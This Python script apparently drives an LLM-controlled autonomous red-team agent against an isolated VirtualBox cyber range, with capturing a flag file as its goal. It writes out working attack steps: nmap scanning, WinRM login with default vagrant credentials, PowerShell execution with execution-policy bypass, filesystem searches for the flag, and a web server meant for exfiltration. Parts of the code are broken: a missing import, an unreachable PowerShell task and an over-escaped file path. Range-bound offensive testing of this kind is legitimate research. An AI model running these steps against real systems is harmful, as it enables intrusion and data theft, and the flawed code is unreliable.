"""
Sombra — Blind autonomous red-team agent for APT32-A.
EARTHQUAKE-NATIVE. No pre-scripted attack chain.
The LLM gets offensive primitives and must discover, exploit, and capture the flag entirely on its own.
Success = flag.txt captured from VictimMachine desktop.
"""
import argparse
import json
import re
import shlex
import subprocess
import time
from typing import Optional

from openai import OpenAI

# ===========================================================================
# Configuration — key asked interactively if not provided
# ===========================================================================
DEEPSEEK_API_KEY = ""  # leave blank to be prompted at runtime

MAX_TURNS     = 40
SNAPSHOT_NAME = "clean"
CMD_TIMEOUT   = 30

# ===========================================================================
# Auto-resolve VM names
# ===========================================================================
def resolve_vm_names():
    """Auto-detect the most recent complete APT32-A VM trio by timestamp."""
    result = subprocess.run("VBoxManage list runningvms", shell=True, capture_output=True, text=True)
    out = result.stdout + result.stderr
    
    # Collect all VMs grouped by their Vagrant timestamp
    # Names look like: localhost_router_1783576270392_41402
    #                         role   ^^^^^^^^^^^ timestamp
    from collections import defaultdict
    timestamp_groups = defaultdict(dict)
    
    for line in out.splitlines():
        if '"' not in line:
            continue
        name = line.split('"')[1]
        parts = name.split('_')
        if len(parts) < 4:
            continue
        # Timestamp is the second-to-last part before the final random ID
        timestamp = parts[-2]  # e.g. "1783576270392"
        lower = name.lower()
        if 'router' in lower and 'victim' not in lower:
            timestamp_groups[timestamp]['router'] = name
        elif 'victimmachine' in lower:
            timestamp_groups[timestamp]['victim'] = name
        elif 'c2server' in lower or 'remoteserver' in lower:
            timestamp_groups[timestamp]['attacker'] = name
    
    # Find the most recent timestamp that has all three roles
    complete_groups = []
    for ts, roles in timestamp_groups.items():
        if len(roles) == 3:
            complete_groups.append((ts, roles))
    
    if not complete_groups:
        raise RuntimeError(
            f"No complete VM trio found. "
            f"Need one router, one VictimMachine, one C2Server/RemoteServer all from the same provisioning run.\n"
            f"Running VMs:\n{out}"
        )
    
    # Pick the most recent (highest timestamp)
    complete_groups.sort(key=lambda x: x[0], reverse=True)
    ts, names = complete_groups[0]
    
    # If there are multiple complete trios, warn
    if len(complete_groups) > 1:
        print(f"[*] Found {len(complete_groups)} complete VM trios. Using the most recent (timestamp {ts}).")
        for other_ts, other_names in complete_groups[1:]:
            print(f"    - Ignoring older trio (timestamp {other_ts}): {list(other_names.values())}")
    
    return names

vm_names = resolve_vm_names()
ATTACKER_VM = vm_names['attacker']
ROUTER_VM   = vm_names['router']
VICTIM_VM   = vm_names['victim']
RANGE_VMS   = [ROUTER_VM, VICTIM_VM, ATTACKER_VM]

print(f"[*] Resolved VMs: router={ROUTER_VM}, victim={VICTIM_VM}, attacker={ATTACKER_VM}")

# APT32-A topology (planner does NOT receive these)
ROUTER_IP   = "192.168.56.177"
VICTIM_IP   = "192.168.56.178"
ATTACKER_IP = "192.168.56.179"

# ===========================================================================
# State Service
# ===========================================================================
class StateService:
    def __init__(self):
        self.discovered_hosts = {}
        self.tested_credentials = []
        self.winrm_sessions = {}
        self.executed_commands = []
        self.found_files = []
        self.flag_found = False
        self.flag_content = None
        self.webhost_running = False
        self.webhost_port = 4443
        self.current_subnet = "192.168.56.0/24"
        self.toolkit_installed = False

    def summary(self) -> str:
        lines = ["DISCOVERED STATE:"]
        if self.discovered_hosts:
            for ip, info in self.discovered_hosts.items():
                ports = info.get('open_ports', [])
                os = info.get('os', 'unknown')
                winrm = " (WinRM authenticated)" if self.winrm_sessions.get(ip) else ""
                lines.append(f"  {ip}: OS={os}, ports={ports}{winrm}")
        else:
            lines.append("  No hosts discovered yet.")
        if self.tested_credentials:
            lines.append("Credentials tested:")
            for host, user, pwd, ok in self.tested_credentials[-5:]:
                lines.append(f"  {host} {user}:{pwd} -> {'SUCCESS' if ok else 'FAILED'}")
        if self.executed_commands:
            lines.append(f"Commands executed on victim: {len(self.executed_commands)}")
        if self.found_files:
            lines.append(f"Files found: {self.found_files[-5:]}")
        lines.append(f"Flag captured: {self.flag_found}")
        lines.append(f"Webhost running: {self.webhost_running}")
        lines.append(f"Toolkit installed: {self.toolkit_installed}")
        return "\n".join(lines)


# ===========================================================================
# Connection plumbing
# ===========================================================================
def host_exec(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=CMD_TIMEOUT + 10)
    return result.stdout, result.stderr, result.returncode


def guest_bash(vm, bash_command):
    vm_cmd = (
        f"timeout {CMD_TIMEOUT} "
        f"VBoxManage guestcontrol {shlex.quote(vm)} run "
        f"--username vagrant --password vagrant "
        f"--exe /bin/bash -- -c {shlex.quote(bash_command)}"
    )
    out, err, _ = host_exec(vm_cmd)
    result = out + err
    if "timed out" in result.lower():
        return "[TIMEOUT]"
    return result


# ===========================================================================
# Toolkit installer
# ===========================================================================
def ensure_toolkit(state: StateService):
    """Install nmap and other tools on the attacker box if missing."""
    if state.toolkit_installed:
        return
    print("[*] Installing offensive toolkit on attacker VM (nmap, curl, python3)...")
    out = guest_bash(ATTACKER_VM,
                     "sudo apt-get update -qq && sudo apt-get install -y -qq nmap curl netcat-openbsd python3-pip 2>&1")
    check = guest_bash(ATTACKER_VM, "command -v nmap && echo INSTALLED || echo MISSING")
    if "INSTALLED" in check:
        state.toolkit_installed = True
        print("[*] Toolkit installed successfully.")
    else:
        print(f"[!] Toolkit install may have failed: {out[:300]}")


# ===========================================================================
# Offensive Task Agents
# ===========================================================================

def agent_scan_network(state: StateService) -> dict:
    """Scan a subnet for live hosts and open ports using nmap."""
    if not state.toolkit_installed:
        return {"success": False, "output": "nmap not installed. Run 'install_toolkit' first."}

    subnet = state.current_subnet
    # Use specific Windows-related ports to actually find the victim
    out = guest_bash(ATTACKER_VM, f"nmap -T4 -p 22,445,3389,5985,5986 --open {subnet} 2>&1")

    if "command not found" in out.lower():
        return {"success": False, "output": f"nmap not found. Install toolkit first.\n{out[:200]}"}

    current_ip = None
    hosts_before = len(state.discovered_hosts)

    for line in out.splitlines():
        m = re.match(r'Nmap scan report for\s+(.+)', line)
        if m:
            host_field = m.group(1).strip()
            ip_match = re.search(r'(\d+\.\d+\.\d+\.\d+)', host_field)
            if ip_match:
                current_ip = ip_match.group(1)
                if current_ip not in state.discovered_hosts:
                    state.discovered_hosts[current_ip] = {"open_ports": [], "os": "unknown"}
        if current_ip and '/tcp' in line and 'open' in line:
            parts = line.split()
            if parts:
                port_str = parts[0].split('/')[0]
                try:
                    port = int(port_str)
                    if port not in state.discovered_hosts[current_ip]["open_ports"]:
                        state.discovered_hosts[current_ip]["open_ports"].append(port)
                except ValueError:
                    pass
        if current_ip and 'Windows' in line:
            state.discovered_hosts[current_ip]["os"] = "Windows"

    hosts_found = len(state.discovered_hosts) - hosts_before

    if hosts_found == 0 and state.current_subnet == "192.168.56.0/24":
        state.current_subnet = "192.168.57.0/24"
        return {"success": True,
                "output": f"No new hosts on 192.168.56.0/24. Auto-switching to {state.current_subnet} for next scan.\n{out[:400]}"}

    if hosts_found == 0:
        return {"success": True, "output": f"No hosts found on {subnet}.\n{out[:400]}"}

    summary_parts = [f"Found {hosts_found} new host(s) on {subnet}:"]
    for ip, info in state.discovered_hosts.items():
        ports = info.get('open_ports', [])
        summary_parts.append(f"  {ip}: ports={ports}")

    return {"success": True, "output": "\n".join(summary_parts) + f"\n\nRaw output:\n{out[:300]}"}


def agent_install_toolkit(state: StateService) -> dict:
    """Install nmap and other offensive tools on the attacker box."""
    ensure_toolkit(state)
    if state.toolkit_installed:
        return {"success": True, "output": "Toolkit installed: nmap, curl, netcat, python3-pip"}
    return {"success": False, "output": "Toolkit installation failed. Check network connectivity."}


def agent_test_winrm(state: StateService) -> dict:
    """Test WinRM credentials against discovered Windows hosts with port 5985."""
    target_ip = None
    for ip, info in state.discovered_hosts.items():
        if 5985 in info.get('open_ports', []) and not state.winrm_sessions.get(ip):
            target_ip = ip
            break
    if not target_ip:
        return {"success": False, "output": "No candidate host found. Scan first to discover hosts with port 5985 open."}

    username, password = "vagrant", "vagrant"

    py_cmd = (
        f"python3 -c \""
        f"from winrm.protocol import Protocol; "
        f"p = Protocol(endpoint='http://{target_ip}:5985/wsman', transport='plaintext', "
        f"username='{username}', password='{password}'); "
        f"s = p.open_shell(); "
        f"c = p.run_command(s, 'echo WINRM_OK'); "
        f"o, e, co = p.get_command_output(s, c); "
        f"print(o.decode()); "
        f"p.close_shell(s)\""
    )
    out = guest_bash(ATTACKER_VM, py_cmd)

    success = "WINRM_OK" in out
    state.tested_credentials.append((target_ip, username, password, success))
    if success:
        state.winrm_sessions[target_ip] = True
        return {"success": True, "output": f"WinRM authenticated to {target_ip} with {username}:{password}!"}
    return {"success": False, "output": f"WinRM auth failed for {target_ip} {username}:{password}. Try different credentials.\n{out[:300]}"}


def agent_execute_powershell(state: StateService, command: str, target_ip: str = None) -> dict:
    """Execute an arbitrary PowerShell command on a compromised host."""
    if not target_ip:
        for ip, authed in state.winrm_sessions.items():
            if authed:
                target_ip = ip
                break
    if not target_ip or not state.winrm_sessions.get(target_ip):
        return {"success": False, "output": "No authenticated WinRM session. Test credentials first."}

    safe_cmd = command.replace('\\', '\\\\').replace('"', '\\"')
    py_cmd = (
        f"python3 -c \""
        f"from winrm.protocol import Protocol; "
        f"p = Protocol(endpoint='http://{target_ip}:5985/wsman', transport='plaintext', "
        f"username='vagrant', password='vagrant'); "
        f"s = p.open_shell(); "
        f"c = p.run_command(s, 'powershell -ExecutionPolicy Bypass -Command \\\"{safe_cmd}\\\"'); "
        f"o, e, co = p.get_command_output(s, c); "
        f"print(o.decode()); "
        f"p.close_shell(s)\""
    )
    out = guest_bash(ATTACKER_VM, py_cmd)
    state.executed_commands.append(command)
    return {"success": True, "output": out[:1000]}


def agent_find_flag(state: StateService) -> dict:
    """Search the victim's filesystem for flag.txt."""
    target_ip = None
    for ip, authed in state.winrm_sessions.items():
        if authed:
            target_ip = ip
            break
    if not target_ip:
        return {"success": False, "output": "No WinRM session. Authenticate first."}

    result = agent_execute_powershell(
        state,
        "Get-ChildItem -Path C:\\Users\\vagrant\\Desktop -Filter flag*.txt | Select-Object FullName",
        target_ip
    )
    if "flag" in result.get("output", "").lower():
        state.found_files.append("C:\\Users\\vagrant\\Desktop\\flag.txt")
        return {"success": True, "output": f"Flag file found on desktop!\n{result['output']}"}

    result2 = agent_execute_powershell(
        state,
        "Get-ChildItem -Path C:\\ -Recurse -Filter flag*.txt -ErrorAction SilentlyContinue | Select-Object FullName -First 5",
        target_ip
    )
    if "flag" in result2.get("output", "").lower():
        state.found_files.append("found via recursive search")
        return {"success": True, "output": f"Flag found via recursive search!\n{result2['output']}"}

    return {"success": True, "output": "Flag not found yet. Try other locations like C:\\Users\\vagrant\\Desktop\\"}


def agent_read_flag(state: StateService) -> dict:
    """Read flag.txt from the victim desktop."""
    target_ip = None
    for ip, authed in state.winrm_sessions.items():
        if authed:
            target_ip = ip
            break
    if not target_ip:
        return {"success": False, "output": "No WinRM session. Authenticate first."}

    flag_path = "C:\\\\\\\\Users\\\\\\\\vagrant\\\\\\\\Desktop\\\\\\\\flag.txt"
    py_cmd = (
        f"python3 -c \""
        f"from winrm.protocol import Protocol; "
        f"p = Protocol(endpoint='http://{target_ip}:5985/wsman', transport='plaintext', "
        f"username='vagrant', password='vagrant'); "
        f"s = p.open_shell(); "
        f"c = p.run_command(s, 'type {flag_path}'); "
        f"o, e, co = p.get_command_output(s, c); "
        f"print(o.decode()); "
        f"p.close_shell(s)\""
    )
    out = guest_bash(ATTACKER_VM, py_cmd)

    if "FLAG{" in out or "flag{" in out:
        for line in out.splitlines():
            if "FLAG{" in line or "flag{" in line:
                state.flag_found = True
                state.flag_content = line.strip()
                return {"success": True, "flag_captured": True,
                        "output": f"FLAG CAPTURED: {line.strip()}"}

    if "cannot find" in out.lower() or "not found" in out.lower():
        return {"success": True, "flag_captured": False, "output": "No flag.txt found on desktop. Use find_flag first."}

    return {"success": True, "flag_captured": False, "output": f"Output: {out[:300]}"}


def agent_start_webhost(state: StateService) -> dict:
    if state.webhost_running:
        return {"success": True, "output": "Webhost already running"}
    guest_bash(ATTACKER_VM, f"nohup python3 -m http.server {state.webhost_port} --directory /tmp > /dev/null 2>&1 &")
    time.sleep(2)
    check = guest_bash(ATTACKER_VM, f"ss -tlnp | grep {state.webhost_port}")
    if "LISTEN" in check:
        state.webhost_running = True
        return {"success": True, "output": f"Webhost started on port {state.webhost_port}"}
    return {"success": False, "output": "Failed to start webhost"}


def agent_done(state: StateService) -> dict:
    return {"success": True, "output": "Planner signaled completion."}


TASK_AGENTS = {
    "install_toolkit": agent_install_toolkit,
    "scan_network": agent_scan_network,
    "test_winrm": agent_test_winrm,
    "find_flag": agent_find_flag,
    "read_flag": agent_read_flag,
    "start_webhost": agent_start_webhost,
    "done": agent_done,
    "finished": agent_done,
    "complete": agent_done,
    "stop": agent_done,
}


# ===========================================================================
# Snapshot management
# ===========================================================================
def ensure_clean_snapshots():
    for vm in RANGE_VMS:
        out, _, _ = host_exec(f"VBoxManage snapshot {shlex.quote(vm)} list")
        if f'"{SNAPSHOT_NAME}"' in out or f"Name: {SNAPSHOT_NAME}" in out:
            continue
        print(f"[*] Taking baseline snapshot of {vm}")
        host_exec(f"VBoxManage snapshot {shlex.quote(vm)} take {shlex.quote(SNAPSHOT_NAME)}")


def restore_clean_snapshots():
    print("[*] Restoring VMs to clean snapshot...")
    for vm in RANGE_VMS:
        host_exec(f"VBoxManage controlvm {shlex.quote(vm)} poweroff || true")
    time.sleep(3)
    for vm in RANGE_VMS:
        host_exec(f"VBoxManage snapshot {shlex.quote(vm)} restore {shlex.quote(SNAPSHOT_NAME)}")
    time.sleep(2)
    for vm in RANGE_VMS:
        host_exec(f"VBoxManage startvm {shlex.quote(vm)} --type headless")
    print("[*] Done.")


# ===========================================================================
# LLM Planner
# ===========================================================================
SYSTEM_PROMPT = f"""You are an autonomous red-team agent with a bash shell on a Linux attack box at {ATTACKER_IP}.
You are inside an isolated cyber range. Your goal: capture flag.txt from a Windows machine somewhere on the network.

YOU KNOW NOTHING ELSE. Discover everything yourself.

AVAILABLE TASKS:
- install_toolkit — install nmap, curl, netcat, python3-pip on your attack box (REQUIRED FIRST)
- scan_network — scan the local subnet for live hosts and open ports
- test_winrm — test vagrant:vagrant WinRM credentials on any host with port 5985 open
- find_flag — search the victim's filesystem for flag.txt
- read_flag — read flag.txt contents from victim desktop
- start_webhost — start an HTTP server on your box (for exfiltration)
- done — signal mission complete

CRITICAL: Run install_toolkit FIRST. Without it, nmap will fail with "command not found".
If a command returns "command not found", install the toolkit and try again.
If scan returns no hosts, try scanning 192.168.56.0/24, then 192.168.57.0/24.
If you get stuck on one task for more than 2 turns, PIVOT to a different approach.

Respond ONLY with JSON.
For execute_powershell, include the command: {{"task": "execute_powershell", "rationale": "...", "command": "..."}}
Otherwise: {{"task": "<task_name>", "rationale": "<why>"}}"""


def get_next_task(state: StateService) -> Optional[dict]:
    try:
        print(f"      [waiting for planner ({LLM_MODEL})...]", flush=True)
        resp = gpu_client.chat.completions.create(
            model=LLM_MODEL,
            messages=[
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": f"Current state:\n{state.summary()}\n\nWhat task next? JSON only."},
            ],
            response_format={"type": "json_object"},
            timeout=120,
        )
        print(f"      [planner responded]", flush=True)
        return json.loads(resp.choices[0].message.content)
    except Exception as e:
        print(f"      [!] Planner error: {e}", flush=True)
        return None


# ===========================================================================
# Main loop
# ===========================================================================
def main():
    parser = argparse.ArgumentParser(description="Sombra — Blind autonomous red-team agent")
    parser.add_argument("--no-restore", action="store_true")
    parser.add_argument("--max-turns", type=int, default=MAX_TURNS)
    parser.add_argument("--api-key", type=str, default="", help="DeepSeek API key (overrides env/hardcoded)")
    args = parser.parse_args()

    # --- Resolve API key ---
    api_key = args.api_key or DEEPSEEK_API_KEY or os.environ.get("DEEPSEEK_API_KEY")
    if not api_key or "sk-your" in api_key:
        api_key = input("DeepSeek API key: ").strip()
    if not api_key:
        print("[!] No API key provided. Exiting.")
        return

    global gpu_client, LLM_MODEL
    if api_key:
        gpu_client = OpenAI(base_url="https://api.deepseek.com/v1", api_key=api_key)
        LLM_MODEL = "deepseek-chat"
    else:
        gpu_client = OpenAI(base_url="http://localhost:11434/v1", api_key="ollama")
        LLM_MODEL = "gemma3:12b"

    print(f"[*] SOMBRA — Blind autonomous red-team agent")
    print(f"[*] Planner: {LLM_MODEL}")

    ensure_clean_snapshots()

    state = StateService()
    print("[*] Initial state: blind. Agent knows only its own IP.")
    print("[*] Installing toolkit...")
    ensure_toolkit(state)
    print("[*] Planner engaged.\n")

    turn = 0
    success = False
    last_task = None
    repeat_count = 0

    try:
        for turn in range(args.max_turns):
            task = get_next_task(state)
            if not task or "task" not in task or not task["task"]:
                print(f"  [!] No valid task from planner, retrying...")
                time.sleep(2)
                continue

            task_name = task["task"]
            rationale = task.get("rationale", "")

            if task_name == last_task:
                repeat_count += 1
            else:
                repeat_count = 0
            last_task = task_name

            print(f"\n{'='*60}")
            print(f"  TURN {turn}")
            print(f"  TASK: {task_name}" + (f" (repeated {repeat_count}x)" if repeat_count > 1 else ""))
            print(f"  WHY:  {rationale}")
            print(f"{'='*60}")

            if task_name in ("done", "finished", "complete", "stop"):
                print(f"  RESULT: Planner signaled completion.")
                if state.flag_found:
                    success = True
                break

            if task_name not in TASK_AGENTS:
                print(f"  [!] Unknown task: {task_name}")
                continue

            if task_name == "execute_powershell":
                cmd = task.get("command", "hostname")
                result = agent_execute_powershell(state, cmd)
            else:
                agent_fn = TASK_AGENTS[task_name]
                result = agent_fn(state)

            status = '✓ SUCCESS' if result.get('success') else '✗ FAILED'
            print(f"  RESULT: {status}")
            output = result.get("output", "")
            if output:
                for line in output.splitlines()[:20]:
                    print(f"  | {line}")
            print(f"{'='*60}")

            if result.get("flag_captured"):
                success = True
                print(f"\n[!!!] FLAG CAPTURED: {state.flag_content}")
                print(f"[!!!] Blind autonomous attack successful on turn {turn}.")
                break

            if repeat_count >= 5 and task_name == "scan_network" and not state.toolkit_installed:
                print(f"  [!] Task '{task_name}' repeated {repeat_count} times. Attempting emergency toolkit install...")
                ensure_toolkit(state)

            time.sleep(1)

        if not success:
            print(f"\n[*] Did not capture the flag in {turn + 1} turns.")
        else:
            print(f"\n[!!!] SOMBRA MISSION COMPLETE.")

    finally:
        if not args.no_restore:
            restore_clean_snapshots()
        print("[*] Done.")


if __name__ == "__main__":
    main()